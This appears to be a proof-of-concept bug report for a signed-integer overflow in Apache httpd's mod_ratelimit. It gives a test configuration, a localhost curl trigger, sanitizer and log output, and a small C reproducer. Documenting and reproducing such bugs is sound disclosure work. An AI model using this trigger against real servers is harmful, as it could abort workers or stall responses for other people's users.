# PoC 194 - Signed Overflow Parsing Rate Limit

`mod_ratelimit` parses `rate-limit` with `atoi()` and multiplies by 1024 in
signed `int`, so `rate-limit=2097152` triggers signed-integer overflow before
the `ratelimit <= 0` guard can run.

## Setup

Build httpd with `mod_ratelimit` and `mod_env` enabled, ideally with
`-fsanitize=undefined` so the overflow is observable.

`/tmp/httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module     modules/mod_mpm_event.so
LoadModule unixd_module         modules/mod_unixd.so
LoadModule authz_core_module    modules/mod_authz_core.so
LoadModule env_module           modules/mod_env.so
LoadModule setenvif_module      modules/mod_setenvif.so
LoadModule ratelimit_module     modules/mod_ratelimit.so
LoadModule dir_module           modules/mod_dir.so
LoadModule mime_module          modules/mod_mime.so

DocumentRoot "/tmp/htdocs"
DirectoryIndex index.html

<Location "/limited">
    SetEnv rate-limit 2097152
    SetOutputFilter RATE_LIMIT
</Location>
<Directory "/tmp/htdocs">
    Require all granted
</Directory>
```

```sh
mkdir -p /tmp/htdocs
python3 -c "open('/tmp/htdocs/index.html','wb').write(b'A'*4096)"
export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
httpd -DFOREGROUND -f /tmp/httpd.conf &
```

## Trigger

```sh
curl -sv http://127.0.0.1:8080/limited/index.html >/dev/null
```

## Observed effect

- UBSan-instrumented build aborts the worker with:

  ```
  modules/filters/mod_ratelimit.c:89:31: runtime error: signed integer overflow:
      2097152 * 1024 cannot be represented in type 'int'
  ```

- Without UBSan, `ratelimit` wraps to `INT_MIN` (`-2147483648`) on most
  ABIs. The follow-up `ratelimit <= 0` check then triggers the
  "disabling: rate-limit ... too high?" log path, but only after the UB has
  occurred. On compilers that fold the overflow assuming defined behavior,
  the wrap may instead be discarded and the filter installs a
  nonsensical `ctx->speed`, causing very long stalls or zero-byte chunked
  output on `/limited/`.
- Log marker (non-instrumented): `error.log` contains
  `AH03488: rl: disabling: rate-limit = 2097152 (too high?)`.
- Log marker (UBSan): worker SIGABRTs and `error.log` records
  `child pid ... exit signal Aborted (6)`.

A purely C-level reproducer without httpd:

```sh
cat > /tmp/rl.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
int main(void){ int r = atoi("2097152") * 1024; printf("r=%d\n", r); }
EOF
cc -O0 -fsanitize=undefined /tmp/rl.c -o /tmp/rl && /tmp/rl
```
